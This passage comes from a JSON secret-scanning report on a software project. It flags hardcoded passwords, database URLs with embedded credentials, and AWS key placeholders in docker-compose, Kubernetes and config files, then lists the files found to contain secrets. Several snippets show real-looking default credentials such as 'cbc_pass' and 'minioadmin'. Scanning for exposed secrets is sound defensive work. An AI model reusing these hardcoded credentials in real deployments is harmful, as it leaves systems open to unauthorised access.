          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 379847,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[^\\\\W\\\\d]\\\\w*'\",\n      \"line_number\": 17,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 379915,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '(?=\\\\s|#|[)\\\\]]|$)'\",\n      \"line_number\": 3041,\n      \"line_range\": "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 379935,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[A-Z]\\\\w*'\",\n      \"line_number\": 334,\n      \"line_range\": ["
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.yml",
            "type": "passwords",
            "line": 70,
            "severity": "CRITICAL",
            "context": "b\n      - POSTGRES_USER=cbc_user\n      - POSTGRES_PASSWORD=cbc_pass\n    volumes:\n      - postgres_data:/var/lib/postg"
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.yml",
            "type": "passwords",
            "line": 129,
            "severity": "CRITICAL",
            "context": "CURITY_ADMIN_USER=admin\n      - GF_SECURITY_ADMIN_PASSWORD=cbc_grafana_pass\n      - GF_USERS_ALLOW_SIGN_UP=false\n    volumes:"
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.yml",
            "type": "database_urls",
            "line": 15,
            "severity": "CRITICAL",
            "context": " RUST_LOG=info\n      - CBC_ENV=production\n      - DATABASE_URL=postgresql://cbc_user:cbc_pass@postgres:5432/cbc_db\n      - REDIS_URL=redis://redis:6379\n    volumes:"
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.yml",
            "type": "database_urls",
            "line": 43,
            "severity": "CRITICAL",
            "context": " RUST_LOG=info\n      - CBC_ENV=production\n      - DATABASE_URL=postgresql://cbc_user:cbc_pass@postgres:5432/cbc_db\n      - REDIS_URL=redis://redis:6379\n      - WORK"
          },
          {
            "file": "code-base-crawler/code-base-crawler/enhanced_security_audit_results_20250608_101718.json",
            "type": "passwords",
            "line": 200,
            "severity": "CRITICAL",
            "context": "         \"original\": \"Database connection failed: password=secret123\",\n          \"sanitized\": \"Authentication failed. P"
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.dev.yml",
            "type": "passwords",
            "line": 34,
            "severity": "CRITICAL",
            "context": "b\n      - POSTGRES_USER=cbc_user\n      - POSTGRES_PASSWORD=cbc_pass\n    volumes:\n      - postgres_dev_data:/var/lib/p"
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.dev.yml",
            "type": "database_urls",
            "line": 15,
            "severity": "CRITICAL",
            "context": "UST_LOG=debug\n      - CBC_ENV=development\n      - DATABASE_URL=postgresql://cbc_user:cbc_pass@postgres:5432/cbc_db\n    volumes:\n      - .:/app\n      - ./logs:/app/l"
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/docker-compose.test.yml",
            "type": "passwords",
            "line": 58,
            "severity": "CRITICAL",
            "context": ":\n      - POSTGRES_USER=cbc_test\n      - POSTGRES_PASSWORD=test_password\n      - POSTGRES_DB=cbc_test_db\n    volumes:\n    "
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/docker-compose.test.yml",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "  - MINIO_ROOT_USER=minioadmin\n      - MINIO_ROOT_PASSWORD=minioadmin\n    volumes:\n      - minio-data:/data\n    ports:\n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/monitoring/docker-compose.monitoring-full.yml",
            "type": "passwords",
            "line": 30,
            "severity": "CRITICAL",
            "context": ":3000\"\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_ADMIN_PASSWORD:-admin}\n      - GF_USERS_ALLOW_SIGN_UP=false\n      - GF_I"
          },
          {
            "file": "code-base-crawler/code-base-crawler/monitoring/alertmanager.yml",
            "type": "passwords",
            "line": 6,
            "severity": "CRITICAL",
            "context": "sername: 'alerts@codebasecrawler.com'\n  smtp_auth_password: 'SMTP_PASSWORD'\n  slack_api_url: 'SLACK_WEBHOOK_URL'\n\nroute:\n  gr"
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
            "type": "database_urls",
            "line": 130,
            "severity": "CRITICAL",
            "context": "s\n  namespace: staging\ntype: Opaque\nstringData:\n  database-url: \"postgresql://user:pass@postgres:5432/cbc_staging\"\n---\napiVersion: autoscaling/v2\nkind: HorizontalPo"
          },
          {
            "file": "api_docs/openapi/mcp_tools_openapi.yaml",
            "type": "aws_keys",
            "line": 24,
            "severity": "CRITICAL",
            "context": "ACK_BOT_TOKEN`\n    - **AWS S3**: Access keys via `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`\n    - **Azure DevOps"
          },
          {
            "file": "api_docs/openapi/mcp_tools_openapi.yaml",
            "type": "aws_keys",
            "line": 24,
            "severity": "CRITICAL",
            "context": "WS S3**: Access keys via `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`\n    - **Azure DevOps**: Personal access token vi"
          },
          {
            "file": "k8s/production/secrets.yaml",
            "type": "passwords",
            "line": 21,
            "severity": "CRITICAL",
            "context": "de_deployment\"\n  db-username: \"claude_admin\"\n  db-password: \"${DB_PASSWORD}\"\n  db-ssl-mode: \"require\"\n\n---\napiVersion: v1\nkind"
          },
          {
            "file": "k8s/production/secrets.yaml",
            "type": "passwords",
            "line": 39,
            "severity": "CRITICAL",
            "context": " \"${REDIS_ENDPOINT}\"\n  redis-port: \"6379\"\n  redis-password: \"${REDIS_PASSWORD}\"\n  redis-ssl: \"true\"\n\n---\napiVersion: v1\nkind: Sec"
          },
          {
            "file": "k8s/production/secrets.yaml",
            "type": "passwords",
            "line": 87,
            "severity": "CRITICAL",
            "context": "heus-token: \"${PROMETHEUS_TOKEN}\"\n  grafana-admin-password: \"${GRAFANA_ADMIN_PASSWORD}\"\n  alert-manager-webhook: \"${ALERT_MANAGER_WEBHOOK"
          },
          {
            "file": "k8s/production/secrets.yaml",
            "type": "database_urls",
            "line": 16,
            "severity": "CRITICAL",
            "context": "will be populated by external secret management\n  database-url: \"postgresql://claude_admin:${DB_PASSWORD}@${DB_ENDPOINT}:5432/claude_deployment?sslmode=require\"\n  db-host: \"${DB_ENDPOINT}\"\n  db-port: \"5432\"\n  d"
          },
          {
            "file": "deploy/config/environments/development.yaml",
            "type": "passwords",
            "line": 45,
            "severity": "CRITICAL",
            "context": "opment credentials\n  db_username: \"dev_user\"\n  db_password: \"dev_password\"\n  redis_password: \"\"  # No auth in development\n  "
          },
          {
            "file": "deploy/config/environments/development.yaml",
            "type": "aws_keys",
            "line": 57,
            "severity": "CRITICAL",
            "context": "d in development\n  \n  # Local cloud credentials\n  aws_access_key_id: \"minioadmin\"\n  aws_secret_access_key: \"minioadmi"
          },
          {
            "file": "deploy/config/environments/development.yaml",
            "type": "aws_keys",
            "line": 58,
            "severity": "CRITICAL",
            "context": "d credentials\n  aws_access_key_id: \"minioadmin\"\n  aws_secret_access_key: \"minioadmin\"\n\nresource_limits:\n  cpu_cores: 2\n  "
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "passwords",
            "line": 43,
            "severity": "CRITICAL",
            "context": "ase credentials\n  db_username: \"DB_USERNAME\"\n  db_password: \"DB_PASSWORD\"\n  \n  # Redis auth\n  redis_password: \"REDIS_PASSWO"
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "passwords",
            "line": 46,
            "severity": "CRITICAL",
            "context": "password: \"DB_PASSWORD\"\n  \n  # Redis auth\n  redis_password: \"REDIS_PASSWORD\"\n  \n  # JWT signing keys\n  jwt_private_key: \"JWT_P"
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "aws_keys",
            "line": 57,
            "severity": "CRITICAL",
            "context": "l: \"SLACK_WEBHOOK_URL\"\n  \n  # Cloud credentials\n  aws_access_key_id: \"AWS_ACCESS_KEY_ID\"\n  aws_secret_access_key: \"AW"
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "aws_keys",
            "line": 57,
            "severity": "CRITICAL",
            "context": "L\"\n  \n  # Cloud credentials\n  aws_access_key_id: \"AWS_ACCESS_KEY_ID\"\n  aws_secret_access_key: \"AWS_SECRET_ACCESS_KEY\""
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "aws_keys",
            "line": 58,
            "severity": "CRITICAL",
            "context": "ntials\n  aws_access_key_id: \"AWS_ACCESS_KEY_ID\"\n  aws_secret_access_key: \"AWS_SECRET_ACCESS_KEY\"\n\nresource_limits:\n  cpu_"
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "type": "aws_keys",
            "line": 58,
            "severity": "CRITICAL",
            "context": "id: \"AWS_ACCESS_KEY_ID\"\n  aws_secret_access_key: \"AWS_SECRET_ACCESS_KEY\"\n\nresource_limits:\n  cpu_cores: 4\n  memory_gb: 8\n"
          },
          {
            "file": "monitoring/production/alertmanager-stack.yaml",
            "type": "passwords",
            "line": 15,
            "severity": "CRITICAL",
            "context": "auth_username: '${SMTP_USERNAME}'\n      smtp_auth_password: '${SMTP_PASSWORD}'\n      slack_api_url: '${SLACK_WEBHOOK_URL}'\n     "
          },
          {
            "file": "monitoring/production/grafana-stack.yaml",
            "type": "passwords",
            "line": 510,
            "severity": "CRITICAL",
            "context": "pace: monitoring\ntype: Opaque\nstringData:\n  admin-password: \"${GRAFANA_ADMIN_PASSWORD}\"\n\n---\n# Grafana PVC\napiVersion: v1\nkind: Persisten"
          },
          {
            "file": "infrastructure/logging/filebeat.yml",
            "type": "passwords",
            "line": 107,
            "severity": "CRITICAL",
            "context": "ps\"\n  username: \"${ELASTICSEARCH_USER:elastic}\"\n  password: \"${ELASTICSEARCH_PASSWORD:}\"\n  \n  # Index configuration\n  index: \"code-logs-%{"
          },
          {
            "file": "infrastructure/logging/filebeat.yml",
            "type": "passwords",
            "line": 132,
            "severity": "CRITICAL",
            "context": "l: \"https\"\n  username: \"${KIBANA_USER:elastic}\"\n  password: \"${KIBANA_PASSWORD:}\"\n\n# Logging configuration for Filebeat itself\nlogg"
          },
          {
            "file": "infrastructure/logging/filebeat.yml",
            "type": "passwords",
            "line": 148,
            "severity": "CRITICAL",
            "context": "200}\"]\n  username: \"${MONITORING_USER:elastic}\"\n  password: \"${MONITORING_PASSWORD:}\"\n\n# Performance tuning\nqueue.mem:\n  events: 4096\n "
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "type": "passwords",
            "line": 19,
            "severity": "CRITICAL",
            "context": ".security.enrollment.enabled=true\n      - ELASTIC_PASSWORD=${ELASTIC_PASSWORD}\n    ulimits:\n      memlock:\n        soft: -1\n    "
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "type": "passwords",
            "line": 55,
            "severity": "CRITICAL",
            "context": " ELASTICSEARCH_USER=elastic\n      - ELASTICSEARCH_PASSWORD=${ELASTIC_PASSWORD}\n      - CLUSTER_NAME=${CLUSTER_NAME:-default}\n   "
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "type": "passwords",
            "line": 78,
            "severity": "CRITICAL",
            "context": "STICSEARCH_USERNAME=elastic\n      - ELASTICSEARCH_PASSWORD=${ELASTIC_PASSWORD}\n      - SERVER_NAME=code-kibana\n      - ELASTICSE"
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": " ELASTICSEARCH_USER=elastic\n      - ELASTICSEARCH_PASSWORD=${ELASTIC_PASSWORD}\n      - KIBANA_HOST=https://kibana:5601\n      - E"
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "type": "passwords",
            "line": 122,
            "severity": "CRITICAL",
            "context": "STICSEARCH_USERNAME=elastic\n      - ELASTICSEARCH_PASSWORD=${ELASTIC_PASSWORD}\n    volumes:\n      - ./curator-actions.yml:/etc/c"
          },
          {
            "file": "src/monitoring/prometheus.yml",
            "type": "passwords",
            "line": 107,
            "severity": "CRITICAL",
            "context": " basic_auth:\n#       username: \"username\"\n#       password: \"password\"\n\n# Recording rules for performance optimization\nr"
          },
          {
            "file": "src/monitoring/docker-compose.monitoring.yml",
            "type": "passwords",
            "line": 37,
            "severity": "CRITICAL",
            "context": ":3000\"\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_ADMIN_PASSWORD}\n      - GF_USERS_ALLOW_SIGN_UP=false\n      - GF_I"
          },
          {
            "file": "src/monitoring/docker-compose.monitoring.yml",
            "type": "passwords",
            "line": 167,
            "severity": "CRITICAL",
            "context": "ing\n      - POSTGRES_USER=claude\n      - POSTGRES_PASSWORD=claude_pass\n    volumes:\n      - postgres-data:/var/lib/postg"
          },
          {
            "file": "containers/development/docker-compose.mcp.yml",
            "type": "database_urls",
            "line": 17,
            "severity": "CRITICAL",
            "context": "DEV_MODE=true\n      - MCP_LOG_LEVEL=debug\n      - DATABASE_URL=postgresql://claude_dev:dev_password_change_in_production@postgres-dev:5432/claude_dev\n      - REDIS_URL=redis://redis-dev:6379\n    volu"
          },
          {
            "file": "containers/development/docker-compose.dev.yml",
            "type": "passwords",
            "line": 92,
            "severity": "CRITICAL",
            "context": "      - POSTGRES_USER=claude_dev\n      - POSTGRES_PASSWORD=dev_password_change_in_production\n      - POSTGRES_INITDB_ARGS=--encoding=UTF-8 --l"
          },
          {
            "file": "containers/development/docker-compose.dev.yml",
            "type": "passwords",
            "line": 148,
            "severity": "CRITICAL",
            "context": " - MINIO_ROOT_USER=minio_admin\n      - MINIO_ROOT_PASSWORD=minio_dev_password\n      - MINIO_CONSOLE_ADDRESS=:9001\n    command: "
          },
          {
            "file": "containers/development/docker-compose.dev.yml",
            "type": "passwords",
            "line": 208,
            "severity": "CRITICAL",
            "context": "CURITY_ADMIN_USER=admin\n      - GF_SECURITY_ADMIN_PASSWORD=dev_password\n      - GF_USERS_ALLOW_SIGN_UP=false\n      - GF_I"
          },
          {
            "file": "containers/production/docker-compose.prod.yml",
            "type": "passwords",
            "line": 173,
            "severity": "CRITICAL",
            "context": "     - POSTGRES_USER=claude_prod\n      - POSTGRES_PASSWORD=${DB_PASSWORD}\n      - POSTGRES_INITDB_ARGS=--encoding=UTF-8 --l"
          },
          {
            "file": "containers/production/docker-compose.prod.yml",
            "type": "database_urls",
            "line": 96,
            "severity": "CRITICAL",
            "context": "NOPTIMIZE=2\n      - PYTHONHASHSEED=random\n      - DATABASE_URL=postgresql://claude_prod:${DB_PASSWORD}@postgres:5432/claude_prod\n      - REDIS_URL=redis://redis:6379/0\n      - SE"
          },
          {
            "file": "containers/production/docker-compose.mcp-prod.yml",
            "type": "passwords",
            "line": 108,
            "severity": "CRITICAL",
            "context": ".security.enrollment.enabled=true\n      - ELASTIC_PASSWORD=${ELASTIC_PASSWORD}\n    ulimits:\n      memlock:\n        soft: -1\n    "
          },
          {
            "file": "containers/production/docker-compose.mcp-prod.yml",
            "type": "database_urls",
            "line": 26,
            "severity": "CRITICAL",
            "context": "pace-size=2048\n      - MCP_LOG_LEVEL=warn\n      - DATABASE_URL=postgresql://claude_prod:${DB_PASSWORD}@postgres:5432/claude_prod\n      - REDIS_URL=redis://redis:6379\n      - ELAS"
          }
        ],
        "files_with_secrets": [
          "test_all_mcp_servers_parallel.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_cftp.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_userauth.py",
          "test_env/lib/python3.12/site-packages/urllib3/connection.py",
          "src/auth/api.py",
          "test_env/lib/python3.12/site-packages/httpcore/_sync/http_proxy.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/telnet.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
          "test_env/lib/python3.12/site-packages/fastapi/openapi/models.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/mail.py",
          "test_environments/monitoring/alert_manager.py",
          "test_env/lib/python3.12/site-packages/twisted/plugins/cred_memory.py",
          "test_env/lib/python3.12/site-packages/twisted/web/distrib.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/userauth.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbercomponent.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
          "test_env/lib/python3.12/site-packages/httpx/_urlparse.py",
          "test_production_modules_comprehensive.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_ircsupport.py",
          "code-base-crawler/code-base-crawler/tests/docker-compose.test.yml",
          "test_env/lib/python3.12/site-packages/twisted/mail/pb.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
          "test_env/lib/python3.12/site-packages/tortoise/__init__.py",
          "code-base-crawler/code-base-crawler/monitoring/alertmanager.yml",
          "test_env/lib/python3.12/site-packages/tortoise/backends/mysql/client.py",
          "test_env/lib/python3.12/site-packages/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/httpcore/_sync/socks_proxy.py",
          "src/database/init.py",
          "deploy/config/environments/development.yaml",
          "test_env/lib/python3.12/site-packages/urllib3/contrib/socks.py",
          "test_env/lib/python3.12/site-packages/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/aiohttp/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/interfaces.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/pop3testserver.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/interfaces.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
          "k8s/production/secrets.yaml",
          "test_env/lib/python3.12/site-packages/fastapi/security/http.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
          "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
          "test_rbac_simple.py",
          "test_log_injection_prevention.py",
          "test_env/lib/python3.12/site-packages/pydantic/networks.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
          "mcp_learning_system/comprehensive_security_analysis_report.json",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "src/database/connection.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/pyodbc.py",
          "full_stack_review_results.json",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/default.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/http_proxy.py",
          "bash_god_deployment.py",
          "infrastructure/logging/filebeat.yml",
          "monitoring/alertmanager.yml",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
          "tests/mcp_security_testing.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
          "src/auth/user_manager.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/config.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_scheme_builtins.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersaslmechanisms.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
          "test_mcp_comprehensive.py",
          "test_env/lib/python3.12/site-packages/urllib3/contrib/emscripten/connection.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/provision.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/test/test_cred.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_unix.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/sanic/__init__.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "k8s/secrets.yaml",
          "k8s/mcp-deployments.yaml",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "k8s/mcp-monitoring.yaml",
          "test_env/lib/python3.12/site-packages/httpcore/_models.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/strcred.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/schema.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/client.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/irc.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/imap4.py",
          "test_env/lib/python3.12/site-packages/websockets/uri.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
          "test_rbac_core.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/tap.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
          "docker-compose.monitoring.yml",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
          "src/monitoring/docker-compose.monitoring.yml",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/tests/test_direct.py",
          "src/utils/database.py",
          "containers/production/docker-compose.mcp-prod.yml",
          "test_env/lib/python3.12/site-packages/tortoise/backends/base_postgres/client.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/tksupport.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/blacksheep/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/checkers.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/psycopg/client.py",
          "tests/conftest.py",
          "test_security_mcp_servers_comprehensive.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/asyncpg/client.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_recvline.py",
          "backup_agent3_20250607_010225/src/mcp/storage/s3_server.py",
          "test_mcp_security_integration.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/conftest.py",
          "monitoring/production/alertmanager-stack.yaml",
          "test_rbac_system.py",
          "code-base-crawler/code-base-crawler/docker-compose.dev.yml",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
          "code-base-crawler/code-base-crawler/security_remediation.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/socks_proxy.py",
          "test_env/lib/python3.12/site-packages/urllib3/connectionpool.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/maildir.py",
          "test_env/lib/python3.12/site-packages/websockets/legacy/auth.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "api_docs/openapi/mcp_tools_openapi.yaml",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/_oid.py",
          "test_env/lib/python3.12/site-packages/uvicorn/config.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/ssh.py",
          "test_env/lib/python3.12/site-packages/requests/auth.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/pydantic/types.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
          "comprehensive_module_test_suite.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/connectors/pyodbc.py",
          "test_env/lib/python3.12/site-packages/twisted/python/util.py",
          "test_env/lib/python3.12/site-packages/twisted/python/test/test_fakepwd.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
          "deploy/config/environments/production.yaml",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/quart/__init__.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
          "test_env/lib/python3.12/site-packages/rich/prompt.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
          "src/mcp/storage/cloud_storage_server.py",
